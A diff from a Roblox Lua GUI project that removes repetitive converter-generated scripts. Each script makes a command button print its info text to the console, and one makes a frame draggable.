-local function KYZK_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd19"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ARTRZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd20"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ZJXPZE_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd21"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function DBSZP_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd22"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ETYSDWC_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd23"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function INCV_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd24"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function HENQJT_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd25"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function DQMN_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd26"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function NIAZRVJ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd27"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function SVTVRR_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd28"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function FRUT_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd29"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function FZDRLZ_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd30"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ILGX_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd31"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function YSASTCL_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd32"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function MUDXM_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd33"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function CMYEHP_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd34"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function XQJECOX_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd35"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function NQVMLY_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd36"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function EQYP_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd37"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function MSBN_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd38"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function LYAQMEP_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd39"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function IGRB_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd40"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function IUCHUX_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.cmd.InfoScript
-    local script = Instance.new("LocalScript")
-    script.Name = "InfoScript"
-    script.Parent = Converted["_cmd41"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local cmd = script.Parent
-	local info = cmd.Info
-	local backupmsg = cmd.Text
-	
-	cmd.MouseButton1Click:Connect(function()
-		cmd.Text = "Info for cmd sent in console (mobile: chat /console | pc: press f9)"
-		print(tostring(info.Value))
-		task.wait(4)
-		cmd.Text = backupmsg
-	end)
-end
-local function ILFUROO_fake_script() -- Fake Script: StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Dragify
-    local script = Instance.new("LocalScript")
-    script.Name = "Dragify"
-    script.Parent = Converted["_CmdFrame"]
-    local req = require
-    local require = function(obj)
-        local fake = fake_module_scripts[obj]
-        if fake then
-            return fake()
-        end
-        return req(obj)
-    end
-
-	local uidrag = Instance.new("UIDragDetector")
-	uidrag.Parent = script.Parent
-end
-
-coroutine.wrap(QGHWZ_fake_script)()
-coroutine.wrap(FGJNAZ_fake_script)()
-coroutine.wrap(AMFF_fake_script)()
-coroutine.wrap(MRQTJE_fake_script)()
-coroutine.wrap(CTCU_fake_script)()
-coroutine.wrap(OKZMXS_fake_script)()
-coroutine.wrap(GOZYZ_fake_script)()
-coroutine.wrap(WVKNMU_fake_script)()
-coroutine.wrap(FDYLHES_fake_script)()
-coroutine.wrap(BPFEH_fake_script)()
-coroutine.wrap(SFTM_fake_script)()
-coroutine.wrap(ACUEPA_fake_script)()
-coroutine.wrap(CVWCXI_fake_script)()
-coroutine.wrap(FJADCS_fake_script)()
-coroutine.wrap(LNGZZGW_fake_script)()
-coroutine.wrap(USNNITV_fake_script)()
-coroutine.wrap(XTRI_fake_script)()
-coroutine.wrap(SVZYGA_fake_script)()
-coroutine.wrap(QHIXJX_fake_script)()
-coroutine.wrap(ASWKXV_fake_script)()
-coroutine.wrap(LPCE_fake_script)()
-coroutine.wrap(KYZK_fake_script)()
-coroutine.wrap(ARTRZ_fake_script)()
-coroutine.wrap(ZJXPZE_fake_script)()
-coroutine.wrap(DBSZP_fake_script)()
-coroutine.wrap(ETYSDWC_fake_script)()
-coroutine.wrap(INCV_fake_script)()
-coroutine.wrap(HENQJT_fake_script)()
-coroutine.wrap(DQMN_fake_script)()
-coroutine.wrap(NIAZRVJ_fake_script)()
-coroutine.wrap(SVTVRR_fake_script)()
-coroutine.wrap(FRUT_fake_script)()
-coroutine.wrap(FZDRLZ_fake_script)()
-coroutine.wrap(ILGX_fake_script)()
-coroutine.wrap(YSASTCL_fake_script)()
-coroutine.wrap(MUDXM_fake_script)()
-coroutine.wrap(CMYEHP_fake_script)()
-coroutine.wrap(XQJECOX_fake_script)()
-coroutine.wrap(NQVMLY_fake_script)()
-coroutine.wrap(EQYP_fake_script)()
-coroutine.wrap(MSBN_fake_script)()
-coroutine.wrap(LYAQMEP_fake_script)()
-coroutine.wrap(IGRB_fake_script)()
-coroutine.wrap(IUCHUX_fake_script)()
-coroutine.wrap(ILFUROO_fake_script)()
+return G2L["1"], require;
